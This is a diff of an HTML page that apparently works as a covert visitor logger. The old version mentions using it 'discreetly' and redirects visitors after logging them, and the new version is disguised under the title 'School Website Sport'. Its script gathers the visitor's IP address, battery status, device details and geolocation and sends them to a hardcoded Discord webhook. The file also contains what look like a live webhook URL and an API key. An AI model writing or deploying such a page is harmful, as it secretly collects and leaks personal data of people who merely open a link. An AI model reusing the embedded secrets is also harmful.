@@ -1,49 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Change this if you want to change the title of the site. Some apps will show the title as a preview, so if you're doing this discreetly, change this. -->
-    <title>YOU'RE SO SILLY!!</title>
-    <!--END OF TITLE-->
-    <!-- This is where the CSS (style code) starts. -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>School Website Sport</title>
     <style>
-        @font-face {
-            font-family: VCR;
-            src: url(https://linux.scot/fonts/VCR.ttf);
-        }
-        #invisibleFrame { display: none; }
-
         body {
+            margin: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, lightblue, lightpurple);
         }
 
         h1 {
-            font-size: 3rem;
-            color: #333;
-            text-transform: uppercase;
-            position: relative;
-            transition: transform 0.3s;
-        }
-
-        h1:hover {
-            transform: scale(1.1);
-            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+            font-size: 2rem;
+            color: white;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
         }
     </style>
-    <!--CSS End.-->
 </head>
-    <body>
-    <h1></h1>
+
+<body>
+    <h1>Gathering Visitor Information...</h1>
     <script>
         // Replace with your Discord webhook URL and IPLookupAPI key
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
         const ipLookupAPIKey = 'ipl_live_TrMYUZ4xSg3eTqWeS3fkWz1mZhG45lOq9fFGI7mD';
         const ipLookupEndpoint = 'https://api.iplookupapi.com/v1/info/';
-        const redirectURL = '';
 
         // Function to get IP address
         function getIPAddress() {
@@ -117,7 +103,7 @@
             `;
         }
 
-        // Function to send data to the Discord webhook and then redirect
+        // Function to send data to the Discord webhook
         function sendToDiscord(ip, battery, deviceInfo, geolocation) {
             const payload = {
                 embeds: [{
@@ -140,14 +126,13 @@
             }).then(response => {
                 if (response.ok) {
                     console.log('Visitor info logged successfully');
-                    window.location.href = redirectURL; // Redirect after logging
                 } else {
                     console.error('Failed to log visitor info:', response.statusText);
                 }
             }).catch(error => console.error('Error sending to webhook:', error));
         }
 
-        // Execute functions and send data, then redirect
+        // Execute functions and send data
         Promise.all([getIPAddress(), getBatteryInfo()])
             .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
